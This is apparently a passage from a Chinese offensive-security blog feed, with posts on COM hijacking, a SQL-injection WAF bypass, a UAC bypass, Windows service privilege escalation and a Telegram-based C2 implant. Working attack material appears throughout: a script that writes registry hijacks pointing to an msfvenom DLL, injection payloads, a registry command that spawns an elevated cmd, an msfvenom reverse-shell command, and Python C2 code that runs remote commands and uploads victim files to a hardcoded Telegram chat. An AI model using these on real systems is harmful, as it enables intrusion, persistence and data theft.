Classes下</code></p><p>用户特定的COM对象可以由中等完整性级别的任何进程注册，并且仅对安装它们的用户可见。但是，它们优先于COM子系统中的机器范围对象。COM对象劫持是一种技术，其中恶意软件可以用在其位置加载的恶意用户特定对象替换良性系统范围的COM对象</p><p><strong>劫持的分类</strong></p><p>1.你拥有一定的权限下直接修改掉能成功加载的CLSID下的InprocServer32的DLL</p><p><code>创建一个恶意的DLL加载正常的DLL后在执行恶意操作</code></p><p>2.寻找缺少的InprocServer32，手动添加</p><p><code>手动添加后，原本找不到CLSID的进程也会找到，从而加载恶意DLL</code></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>os:windows 10 1903</p><p>工具:Procmon</p><h2 id="寻找缺失的CLSID"><a href="#寻找缺失的CLSID" class="headerlink" title="寻找缺失的CLSID"></a>寻找缺失的CLSID</h2><p>这里我针对Explorer.exe寻找缺少的CLSID，对Explorer进行过滤配置</p><p><img src="https://s2.ax1x.com/2019/09/11/naNrrR.png" alt=""></p><p>寻找到缺少的CLSID</p><p><img src="https://s2.ax1x.com/2019/09/11/naNsq1.png" alt=""></p><p>你可以针对这里的当个路径进行测试或者批量测，由于某些不可抗拒的原因我选择的了批量测。批量测试的话将过滤得到的路径保存为CSV</p><p><strong>测试的方法：</strong></p><p>使用reg添加缺少CLSID路径，设置你要执行的恶意DLL路径</p><pre><code>reg add [PATH] /ve /t REG_SZ /d C:\Users\Public\demo.dll /f</code></pre><p><img src="https://s2.ax1x.com/2019/09/11/naNca6.png" alt=""></p><p>然后对CSV进行解析，生成一个bat</p><pre><code class="python">#@author:九世#@file:com_hajacking.pyimport csvclass Jiexi(object):    def __init__(self):        self.path=&#39;demo.CSV&#39;    def rk(self):        with open(self.path,&#39;r&#39;,encoding=&#39;utf-8&#39;) as r:            g=csv.DictReader(r)            for name in g:                z=[x for x in name]                for i in z:                    if &#39;HK&#39; in str(name[i]):                        print(&#39;reg add {} /ve /t REG_SZ /d C:\\Users\\Public\\demo.dll /f&#39;.format(name[i]),file=open(&#39;com_hijack.bat&#39;,&#39;a&#39;,encoding=&#39;utf-8&#39;))if __name__ == &#39;__main__&#39;:    obj=Jiexi()    obj.rk()    print(&#39;[!] Administrator run com_hijack.bat,Thanks&#39;)</code></pre><p>得到一个bat</p><p><img src="https://s2.ax1x.com/2019/09/11/naNRPO.png" alt=""></p><p>这里的dll我用msfvenom生成的,这里注意选对位数。上面说的不可抗拒原因是因为我单个测试的时候生成错了位数导致我以为不行，后面生成了x64进行批量。COM劫持的过多把Windows 10弄死了</p><p>劫持成功如图：</p><p><img src="https://s2.ax1x.com/2019/09/11/naNWGD.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cyberbit.com/blog/endpoint-security/com-hijacking-windows-overlooked-security-vulnerability/" target="_blank" rel="noopener">https://www.cyberbit.com/blog/endpoint-security/com-hijacking-windows-overlooked-security-vulnerability/</a></p><p><a href="https://github.com/nccgroup/acCOMplice/blob/master/COM_Hijacking_Techniques_Derbycon2019.pptx" target="_blank" rel="noopener">https://github.com/nccgroup/acCOMplice/blob/master/COM_Hijacking_Techniques_Derbycon2019.pptx</a></p><p>COM劫持的第二种利用方式：</p><p><a href="https://www.baidu.com/link?url=2nHrX1Lv7WzjP4EmZTtmX5eszr4BmXGOlhTBpBB48izGijoiU8XV2C1TTeDlLjjCzqIulM1PFpY1_2mJB-jo4q&amp;wd=&amp;eqid=cfe342d40004e915000000065d77f264" target="_blank" rel="noopener">https://www.baidu.com/link?url=2nHrX1Lv7WzjP4EmZTtmX5eszr4BmXGOlhTBpBB48izGijoiU8XV2C1TTeDlLjjCzqIulM1PFpY1_2mJB-jo4q&amp;wd=&amp;eqid=cfe342d40004e915000000065d77f264</a></p>]]></content>
      
      
        <tags>
            
            <tag> COM hajacking </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记一次失败的过云锁</title>
      <link href="/posts/1aa6f64d.html"/>
      <url>/posts/1aa6f64d.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>日站天天碰云锁？旁站都是注入，一点开，我草，云锁？云锁！云锁！云锁，云SUO。草</p><p><img src="https://s2.ax1x.com/2019/09/10/nNPs2R.jpg" alt=""></p><h2 id="云锁的安装方法"><a href="#云锁的安装方法" class="headerlink" title="云锁的安装方法"></a>云锁的安装方法</h2><p>先安服务端，在安PC端。然后去官网注册个号，打开PC端用账号登入之后使用本机的用户名和密码连接云锁的5555端口。然后就能在PC端见到你的机子了</p><p><a href="https://www.yunsuo.com.cn/" target="_blank" rel="noopener">云锁官网</a></p><p><a href="https://www.yunsuo.com.cn/download.html" target="_blank" rel="noopener">云锁下载地址</a></p><p><img src="https://s2.ax1x.com/2019/09/10/nNkXdK.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/09/10/nNkzJe.png" alt=""></p><h2 id="初试"><a href="#初试" class="headerlink" title="初试"></a>初试</h2><p>and 1=1这种，被杀穿了就不弄他了</p><pre><code>id=if(1=1,(1=1),1)id=1 %26%26 Trueid=1 Xor 1=1 #大部分WAF对Xor都是网开一面</code></pre><p><img src="https://s2.ax1x.com/2019/09/10/nNP5PH.png" alt=""></p><p>云锁比较直男，直接就弹框告诉你触发了那个敏感规则</p><p><img src="https://s2.ax1x.com/2019/09/10/nNPTxI.png" alt=""></p><p>盲注测试</p><pre><code>id=2 Xor length(database())=4id=2 Xor left(database(),4)=&quot;test&quot;</code></pre><p><img src="https://s2.ax1x.com/2019/09/10/nNktKI.png" alt=""></p><p>后面参考404表哥的mysql bypass 文章发现还是过不了，我当时就绝望的一批</p><h2 id="得到的规则"><a href="#得到的规则" class="headerlink" title="得到的规则"></a>得到的规则</h2><p>后面我在这里发现了云锁的一些规则：</p><pre><code>/**/替换为空/*!*/替换为空匹配的关键有:and,or,updatexml,select xxx from,union xxx select匹配select xx from的正则应该是:select .*? from匹配union xx select的正则应该是:union .*? select不认识的请求直接拦截</code></pre><p><img src="https://s2.ax1x.com/2019/09/10/nNkwa8.png" alt=""></p><p>规则：</p><p><img src="https://s2.ax1x.com/2019/09/10/nNkoRJ.png" alt="image"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://422926799.github.io/posts/acb30657.html" target="_blank" rel="noopener">sql注入过防御笔记</a></p><p><a href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/blob/master/2-6-拓展Bypass的常用思路.md" target="_blank" rel="noopener">拓展Bypass的常用思路</a></p><p><a href="[https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/blob/master/2-5-%E6%88%91%E4%B8%8E%E4%BA%91%E9%94%81%E6%9C%89%E4%B8%AA%E7%BA%A6%E4%BC%9A.md](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/blob/master/2-5-我与云锁有个约会.md">我与云锁有个约会</a>)</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>GUI_UAC_bypassX</title>
      <link href="/posts/3fa71b88.html"/>
      <url>/posts/3fa71b88.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天晚上看群发现有人发了个新的Bypass UAC的文章。就复现了一下，顺便分析了一手= =</p><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1568079466&amp;di=e7c9764cbd4f1276ad04682c6ecf0df2&amp;imgtype=jpg&amp;er=1&amp;src=http%3A%2F%2Fsource.upupoo.com%2Ftheme%2F1800030497%2Fpreview.jpg" alt=""></p><h2 id="bypass-Demon"><a href="#bypass-Demon" class="headerlink" title="bypass Demon"></a>bypass Demon</h2><p>链接：</p><p><a href="https://github.com/sailay1996/GUI_UAC_bypassX/blob/master/README.md" target="_blank" rel="noopener">https://github.com/sailay1996/GUI_UAC_bypassX/blob/master/README.md</a></p><p>然后惊人的发现执行的命令和今年1月的命令一毛一样。什么是忍甲，这就是忍甲</p><p><img src="https://s2.ax1x.com/2019/09/03/nFnz11.png" alt=""></p><p>​        <a href="https://zhuanlan.zhihu.com/p/55728445" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/55728445</a></p><p><img src="https://s2.ax1x.com/2019/09/03/nFuZ9A.png" alt=""></p><p>执行以下命令并打开<strong>netplwiz.exe</strong>然后找到高级点击管理密码，就会弹出个cmd</p><p><code>reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d &quot;cmd.exe /c cmd.exe&quot; /f &amp;&amp; reg add HKCU\Software\Classes\Folder\shell\open\command /v &quot;DelegateExecute&quot; /f</code> </p><p><img src="https://s2.ax1x.com/2019/09/03/nFKe54.png" alt=""></p><p>还原注册表：<code>reg delete &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /f</code> </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>打开Procmon.exe配置以下过滤</p><p><img src="https://s2.ax1x.com/2019/09/03/nFM8ln.png" alt=""></p><p>然后搜索command关键字</p><p><img src="https://s2.ax1x.com/2019/09/03/nFMq78.png" alt=""></p><p>大概的搜了一下HKCR注册表（忘了）</p><p><img src="https://s2.ax1x.com/2019/09/03/nFQ63j.png" alt=""></p><p>执行上面的命令在看了一下刚刚的那个位置发现被加载成功了</p><p><img src="https://s2.ax1x.com/2019/09/03/nFQz5D.png" alt=""></p><p>针对<code>HKCU\Software\Classes\Folder\shell\open\command</code>路径看了一下，发现执行了以上的命令打开上面文件夹，盘符等等。全部会执行你那个路径里设置的进程</p><p><img src="https://s2.ax1x.com/2019/09/03/nFloeP.png" alt=""></p><p>后面问了某gay友知道<code>HKCU\Software\Classes\Folder\shel</code>这个路径是windows配置的。至于为什么会出现文件夹和盘符都是执行路径里设置的进程。我bu de而知</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows配置错误导致的提权</title>
      <link href="/posts/34b370c6.html"/>
      <url>/posts/34b370c6.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于管理员或用户对某些服务或权限设置错误，导致提权</p><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1566811889993&amp;di=a7f8f8a7e0740867fcc2d63a33d95888&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201502%2F06%2F20150206172439_5PiSf.jpeg" alt=""></p><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>参考文章：<a href="https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html" target="_blank" rel="noopener">https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html</a></p><p>首先先搭建对应的环境：</p><pre><code>windows 10</code></pre><p>将以下保存为bat并以管理员权限执行</p><pre><code class="bat">echo [*] Create user lowusernet user lowuser lowuser1234 /addecho [*] Create directories for the binaryPath of our servicesmkdir &quot;C:\WeakServices\Weak Service 1&quot;mkdir &quot;C:\WeakServices\WeakService2&quot;mkdir &quot;C:\WeakServices\WeakService3&quot;mkdir &quot;C:\WeakServices\WeakService4&quot;echo [*] Use a default binarycopy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\Weak Service 1\service1.exe&quot;copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService2\service2.exe&quot;copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService3\service3.exe&quot;copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService4\service4.exe&quot;echo [*] settings 权icacls &quot;C:\WeakServices\Weak Service 1&quot; /deny lowuser:Micacls &quot;C:\WeakServices\WeakService3&quot; /deny lowuser:Micacls &quot;C:\WeakServices\WeakService4&quot; /deny lowuser:Mecho [*] 四服务sc create WeakService1 displayName= &quot;Unquoted Service Path&quot; binPath= &quot;C:\WeakServices\Weak Service 1\service1.exe&quot; start= autosc create WeakService2 displayName= &quot;Weak Folder Permissions&quot; binPath= &quot;C:\WeakServices\WeakService2\service2.exe&quot; start= autosc create WeakService3 displayName= &quot;Weak Service Permissions&quot; binPath= &quot;C:\WeakServices\WeakService3\service3.exe&quot; obj= .\lowuser password= lowuser1234 start= autosc create WeakService4 displayName= &quot;Weak Registry Permissions&quot; binPath= &quot;C:\WeakServices\WeakService4\service4.exe&quot; start= demandecho [*] Modifying WeakService3&#39;s permissionssc sdset WeakService3 &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;DCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code></pre><p>创建完成后会有一个lowsuer用户，以及对应的服务</p><p><img src="https://s2.ax1x.com/2019/08/26/mWfGnJ.png" alt="éç½®ç¯å¢"></p><p>创建完成</p><p><img src="https://s2.ax1x.com/2019/08/26/mWfw9K.png" alt="éç½®å®æ"></p><h2 id="常见的四种错误"><a href="#常见的四种错误" class="headerlink" title="常见的四种错误"></a>常见的四种错误</h2><ul><li>不带引号的服务路径</li><li>弱文件夹权限</li><li>弱服务权限</li><li>注册表权限不足</li></ul><p>利用的要求是：服务是系统启动时自启动的,服务的权限为高权用户</p><p>推荐利用手法：生成一个执行创建Administrator用户的exe，推测应该执行服务就断了所以反弹meterpreter那些不可取，下面会说到</p><h2 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h2><p>执行wmic命令来过滤出不带引号的服务路径</p><pre><code class="cmd">wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></pre><p><img src="https://s2.ax1x.com/2019/08/26/mWhNrQ.png" alt="ä¸å¸¦å¼å·çæå¡è·¯å¾"></p><p>使用sc查看对应的服务</p><p>PS:AUTO_START是系统启动将自启动该服务的意思</p><pre><code>sc qc [servicename]</code></pre><p><img src="https://s2.ax1x.com/2019/08/26/mWhtKg.png" alt="æå¡è·¯å¾"></p><p>查看BINARY_PATH_NAME第一个父文件夹的权限</p><pre><code>icacls [path]</code></pre><p><img src="https://s2.ax1x.com/2019/08/26/mWhjII.png" alt="æä»¶å¤¹æé"></p><p>可以从图中得到如下信息：</p><pre><code>所有者:NT AUTHORITY\SYSTEM可操作的用户组:NT AUTHORITY\Authenticated Users (所有用户的意思)</code></pre><p>根据文章中说的带引号的文件寻找方法和不带引号的文件寻找方法：</p><p><img src="https://s2.ax1x.com/2019/08/26/mW4KQU.png" alt="image"></p><p>然后使用msfvenom创建一个exe，改名为Weak.exe放入C:WeakServices\Weak.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe &gt; Weak.exe</code></pre><p>这里可能就有人问了，如果文件名没空格呢？比如C:lbw\Fuckyou\nm.exe那么就在lbw文件夹下创建</p><p>一个名为Fuckyou.exe，然后把Fuckyou文件夹给改名</p><p>由于低权用户无法重启服务，但是可以通过重启系统来让服务重新执行。重启之后将执行C:WeakServices\Weak.exe,为什么呢？因为在寻找二进制过程中，当发现由exe结尾的就会认为是对应服务的二进制文件，导致滥用</p><p>重启windows</p><p><img src="https://s2.ax1x.com/2019/08/26/mW5R41.md.png" alt="éå¯"></p><p>在登录界面短暂的获取到meterpreter，我不清楚这里是windows10的问题还是什么原因，过了一段时间就会掉了</p><p><img src="https://s2.ax1x.com/2019/08/26/mW5UNn.png" alt="åå¼¹meterpreter"></p><p>不知道什么原因？</p><p><img src="https://s2.ax1x.com/2019/08/26/mW5j8P.png" alt="ä¸ç¥éä»ä¹åå "></p><p>这是GIF示例</p><p><img src="https://s2.ax1x.com/2019/08/26/mWovnS.gif" alt="GIF"></p><p>system权限图</p><p><img src="https://s2.ax1x.com/2019/08/26/mWqsRs.png" alt="image"></p><h2 id="弱文件夹权限"><a href="#弱文件夹权限" class="headerlink" title="弱文件夹权限"></a>弱文件夹权限</h2><p>这里用WeaKService2做示例</p><p><img src="https://s2.ax1x.com/2019/08/26/mWoQOS.png" alt="image"></p><p>第一步寻找允许任意用户修改的服务，并且权限是高权用户所执行的（补充有说明）</p><p><img src="https://s2.ax1x.com/2019/08/26/mWTL59.png" alt="image"></p><p>得到所有用户都可以访问的结果后，生成一个exe将其改名为服务启动的exe替换。并长重启系统，这里用calc做例子</p><p><img src="https://s2.ax1x.com/2019/08/26/mW7fde.png" alt="image"></p><p>或者你直接把存放服务指定二进制的文件夹给改名了，自己在创建服务指定的二进制文件的文件夹。这里就是新建一个WeakServices2文件夹</p><p><img src="https://s2.ax1x.com/2019/08/26/mWLuSs.png" alt="image"></p><p>重启GIF</p><p><img src="https://s2.ax1x.com/2019/08/26/mWLI78.gif" alt="GIF"></p><h2 id="弱服务权限"><a href="#弱服务权限" class="headerlink" title="弱服务权限"></a>弱服务权限</h2><p>用WeakService3来做示例(<img src="https://s2.ax1x.com/2019/08/26/mfuxzj.png" alt="1566806147207"></p><p>这里要用到一个工具来查看服务的权限，accesschk，下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk" target="_blank" rel="noopener">accesschk</a></p><p>执行accesschk -cv [service name]</p><p><img src="https://s2.ax1x.com/2019/08/26/mWx8JS.png" alt="image"></p><p>允许Everyone设置服务任何操作，那么通过修改服务的BINARY_PATH_NAME,并重启该服务即可提升权限。这里将BINARY_PATH_NAME设置为如下路径</p><p><img src="https://s2.ax1x.com/2019/08/26/mWzR1g.png" alt="image"></p><p>动态GIF</p><p><img src="https://s2.ax1x.com/2019/08/26/mfS1gg.gif" alt="GIF"></p><h2 id="注册表权限不足"><a href="#注册表权限不足" class="headerlink" title="注册表权限不足"></a>注册表权限不足</h2><p>错误配置的服务注册表项，注册表路径HKLM\SYSTEM\CurrentControlSet\Services\&lt;service_name&gt;</p><p>存放着对应的服务设置</p><p><img src="https://s2.ax1x.com/2019/08/26/mfp8JK.md.png" alt="image"></p><p>使用accesschk检查注册表的权限</p><p>执行<code>accesschk -kvw [regedit path]</code></p><p><img src="https://s2.ax1x.com/2019/08/26/mfFyrD.png" alt="image"></p><p>我这里查询不到，但是文章是可以查的到的。不过没关系，直接手动打开注册表对服务的ImagePath进行修改，如果修改成功的话就代表有权限。否则就没有</p><p>修改前：</p><p><img src="https://s2.ax1x.com/2019/08/26/mfF4RP.md.png" alt="image"></p><p>（好吧，不是accesschk 的错，的确没有权限，那么这里就不弄了。可以自己看参考文章）</p><p><img src="https://s2.ax1x.com/2019/08/26/mfFTsS.md.png" alt="image"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>寻找弱文件夹权限和弱服务权限使用到的操作是使用：accesschk64.exe -cv *</p><p>获取所有服务，然后搜索关键字:RW Everyone，挑选高权的服务</p><p><img src="https://s2.ax1x.com/2019/08/26/mfE9UJ.png" alt="image"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当exp提权不下的时候，可以尝试寻找这些错误的配置。来提升自己的权限</p>]]></content>
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Telegram做C2?</title>
      <link href="/posts/da6d6ea3.html"/>
      <url>/posts/da6d6ea3.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到某位师傅写了个Tg的C2，看起来不错打算自己也来操作一波</p><p><img src="http://vpic.video.qq.com/3388556/d05581emq3x_ori_3.jpg" alt="img"></p><p>单方面缺点：一个bot只能开一次，多开409（冲突）</p><h2 id="选择环境"><a href="#选择环境" class="headerlink" title="选择环境"></a>选择环境</h2><p>Tg官方给出了很多语言的API模块，看你选择哪个</p><p><a href="https://core.telegram.org/bots/samples" target="_blank" rel="noopener">Telegram Bots</a></p><p><img src="https://s2.ax1x.com/2019/08/20/mYl5nK.png" alt="image"></p><p>我这里用的是python开发的，用的模块是</p><p><img src="https://s2.ax1x.com/2019/08/20/mYlI0O.png" alt="image"></p><p>README.md给出的说明:<a href="https://github.com/eternnoir/pyTelegramBotAPI" target="_blank" rel="noopener">Telegram API-&gt;README.md</a></p><p><img src="https://s2.ax1x.com/2019/08/20/mY3EPH.png" alt="image"></p><p>最后定下来的环境：</p><pre><code>version:python3.7modules：requests,pyTelegramBotAPIos:windows</code></pre><p>c2针对的系统</p><pre><code>os:windows</code></pre><h2 id="创建一个Bot"><a href="#创建一个Bot" class="headerlink" title="创建一个Bot"></a>创建一个Bot</h2><p>登录Tg</p><blockquote><p>访问<a href="https://telegram.me/botfather" target="_blank" rel="noopener">https://telegram.me/botfather</a></p><p>添加BotFather为联系人(BotFather用来创建和管理自定义bot)</p><p>发送/newbot,输入用户名和Bot的名称即可完成创建一个bot</p></blockquote><p><img src="https://wooyun.js.org/images_result/images/20160526155935581702-21.png" alt=""></p><p>创建完成后，你会得到你新建bot的token</p><p><img src="https://s2.ax1x.com/2019/08/20/mY8apd.png" alt="N(%V~P0N$PW23(RF4VN6UL3"></p><p>然后添加你新建的机器人，直接搜索添加就好</p><p><img src="https://s2.ax1x.com/2019/08/20/mY8r0f.png" alt="æ·»å ä½ çæºå¨äºº"></p><h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><p>整体的交互流程如图：</p><p>(画图较丑，见谅)</p><p><img src="https://s2.ax1x.com/2019/08/20/mYG8vn.png" alt="image"></p><p>首先tg的API模块给出了很多封装的函数（装饰器），用于处理接收、发送、文件上传、文件下载</p><p>PS:建议看一下API文档在来看</p><p>制定一条命令，当attack执行了该指令的时候执行对应的操作与处理无效指令</p><pre><code class="python">import telebotbot = telebot.TeleBot(&quot;TOKEN&quot;)@bot.message_handler(commands=[&#39;start&#39;, &#39;help&#39;])def send_welcome(message):    bot.reply_to(message, &quot;demo&quot;) #获取消息句柄，返回对应消息@bot.message_handler(func=lambda message: True)def echo_all(message):    bot.reply_to(message, message.text) #返回输入无效的指令bot.polling() #运行bot</code></pre><p><img src="https://s2.ax1x.com/2019/08/20/mYJbl9.png" alt="image"></p><p>然后构造各个指令对应的函数</p><pre><code class="python">@bot.message_handler(commands=[&#39;help&#39;])def send_welcome(message):    bot.reply_to(message,&#39;/cmd [token] [command] -- 执行cmd命令\n/computer -- 查看主机信息\n/upload [token] [filepath] -- 上传机器的文件到tg\n/download [token] [fileptah] -- 下载远程文件到目标机器\n/help [token] -- 帮助信息&#39;)@bot.message_handler(commands=[&#39;computer&#39;])def commputer(message):    bot.reply_to(message,&#39;主机信息:&#39;)    jg=&#39;name:{} ID:{} {}&#39;.format(str(hostname).lstrip().rstrip().replace(&#39;\n&#39;,&#39;&#39;),LD[0],IPS[0])    bot.reply_to(message,jg)@bot.message_handler(regexp=&quot;[/]cmd [0-9-a-z]{32} .*&quot;) #当返回的内容正则能匹配成功后执行以下def handle_message(message):    command=str(message.text).replace(&#39;/cmd&#39;,&#39;&#39;).strip().lstrip()    ken=re.findall(&#39;[0-9-a-z]{32}&#39;,command)    if ken[0]==LD[0]:        commands=re.subn(&quot;[0-9-a-z]{32}&quot;,&quot;&quot;,command)        cmd=str(commands[0]).lstrip().rstrip()        jg=os.popen(&#39;cmd.exe /c {}&#39;.format(cmd)).read()        splitted_text=util.split_string(jg,3000)        for text in splitted_text:            bot.reply_to(message,text)@bot.message_handler(regexp=&quot;[/]upload [0-9-a-z]{32} .*&quot;)def upload(message):    command=str(message.text).replace(&#39;/upload&#39;,&#39;&#39;).strip().lstrip()    ken=re.findall(&#39;[0-9-a-z]{32}&#39;,command)    if ken[0]==LD[0]:        commands=re.subn(&quot;[0-9-a-z]{32}&quot;,&quot;&quot;,command)        path=str(commands[0]).lstrip().rstrip()        file_name=str(path).split(&#39;\\&#39;)[-1]        try:            file=open(path,&#39;rb&#39;)            bot.send_document(631202355,file,caption=file_name)        except:            pass            bot.send_message(631202355,&#39;没有:{}这个文件&#39;.format(path))@bot.message_handler(regexp=&quot;[/]download [0-9-a-z]{32} .*&quot;)def download(message):  command = str(message.text).replace(&#39;/download&#39;, &#39;&#39;).strip().lstrip()  ken = re.findall(&#39;[0-9-a-z]{32}&#39;, command)  if ken[0] == LD[0]:    url=re.subn(&quot;[0-9-a-z]{32}&quot;, &quot;&quot;, command)    try:        file_name=str(url[0].split(&#39;/&#39;)[-1])        dk=open(file_name,&#39;wb&#39;)        rqt=requests.get(url=str(url[0]).lstrip().rstrip(),headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#39;},timeout=30)        print(rqt.status_code)        dk.write(rqt.content)        dk.close()        if os.path.exists(file_name):            bot.send_message(631202355,&#39;文件:{} download 成功!&#39;.format(file_name))        else:            bot.send_message(631202355, &#39;文件:{} download 失败!&#39;.format(file_name))    except Exception as r:        bot.send_message(631202355,&#39;Error:{}&#39;.format(r))</code></pre><p>这里对应指令</p><pre><code>指令：/help,/cmd,/upload,/download,/computer</code></pre><p>PS：我原本打算用Tg控制多个bot的，所以写了生成token这个操作，后面发生409（请求冲突问题）。Google一堆也没解决方案，就没去改他了</p><p>完整代码-&gt;仓库地址：<a href="[https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/tgc2](https://github.com/422926799/note/tree/master/自己写的工具/tgc2">Tg_C&amp;C</a>)</p><p>测试结果：</p><p><img src="https://camo.githubusercontent.com/eab6a226745b2c0eef020f6f936cf6ae9fcc54d2/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d596b744a4f2e706e67" alt="QQÃ¥ï¿½Â¾Ã§ï¿½ï¿½20190820183651"></p><p><img src="https://camo.githubusercontent.com/2e28d621ecee1410f3e9d0ae13d924e27466bd0d/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d596b66796a2e706e67" alt="QQÃ¥ï¿½Â¾Ã§ï¿½ï¿½20190820183708"></p><p><img src="https://camo.githubusercontent.com/abd1c816a03d135fa6cbc3dbc7129dbf2ff74dc4/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d59414558642e706e67" alt="QQÃ¥ï¿½Â¾Ã§ï¿½ï¿½20190820183630"></p><p><img src="https://camo.githubusercontent.com/faa7df5d3f6b29714d285ca6af8b2d2a293e8f14/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d59414d68382e706e67" alt="QQÃ¥ï¿½Â¾Ã§ï¿½ï¿½20190820183643"></p><p>GIF</p><p><img src="https://camo.githubusercontent.com/e5f9d1c0f1ca03e0f58dd32022e8eeee1b738bd2/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d59566973482e676966" alt="GIF"></p>]]></content>
      
      
        <tags>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬取Google的心酸之路</title>
      <link href="/posts/fb94aaaa.html"/>
      <url>/posts/fb94aaaa.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>早在前段时间就尝试写过爬Google的了。当时由于解决不了验证码就删了，当然这次也没解决。验证码不能绕过，只能避免，减少遇见</p><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1230641777,4087420761&amp;fm=26&amp;gp=0.jpg" alt="img"></p><h2 id="0x001过程"><a href="#0x001过程" class="headerlink" title="0x001过程"></a>0x001过程</h2><p>爬虫我追求，快、稳。但是由于Google这恶心的验证码机制，导致我不得不放弃这个想法。转而话费大量时间来解决频频碰到验证码的问题</p><p>写法只有请求，不换user-agent头的，加上多进程或多线程调用。一次就封IP了</p><pre><code class="python">import requestsrqt=requests.get(url=&#39;https://www.google.com/search?q=xxx&amp;start=1&#39;,headers={&#39;user-agent&#39;:&#39;Google Splider&#39;},timeout=3)</code></pre><p>后面参考了几篇文章和一个项目：</p><p><a href="https://juejin.im/post/5c2c6bbee51d450d5a01d70a" target="_blank" rel="noopener">对于 Python 抓取 Google 搜索结果的一些了解</a></p><p><a href="https://github.com/MarioVilas/googlesearch" target="_blank" rel="noopener">Google_search</a></p><p>看了这两个操作之后，发现都是用了同一操作</p><ul><li>随机User-Agent头</li><li>随机使用Google的搜索子域</li></ul><p><img src="https://s2.ax1x.com/2019/08/19/m3R0yT.png" alt="image"></p><p>收集的User-agent头</p><p><img src="https://s2.ax1x.com/2019/08/19/m3Rsw4.png" alt="image"></p><p>实现这两种随机很容易，只需全部放入两个数组。使用random.choice()随机抽取即可</p><pre><code class="python">def read():    dk=open(&#39;user_agents.txt&#39;,&#39;r&#39;,encoding=&#39;utf-8&#39;)    for r in dk.readlines():        data=&quot;&quot;.join(r.split(&#39;\n&#39;))        yield datadef reads():    dk=open(&#39;domain.txt&#39;,&#39;r&#39;,encoding=&#39;utf-8&#39;)    for r in dk.readlines():        data=&quot;&quot;.join(r.split(&#39;\n&#39;))        yield datadef fenpei(proxy,search,page,sleep):    user_agents=[]    google_searchs=[]    for ua in read():        user_agents.append(ua)    for domain in reads():        google_searchs.append(domain)</code></pre><p>虽然实现随机了，但是还是很脆弱。还是经不起Google那个狗贼般的验证码的摧残，在给其加上一个延时</p><pre><code class="python">import randomimport requestsimport 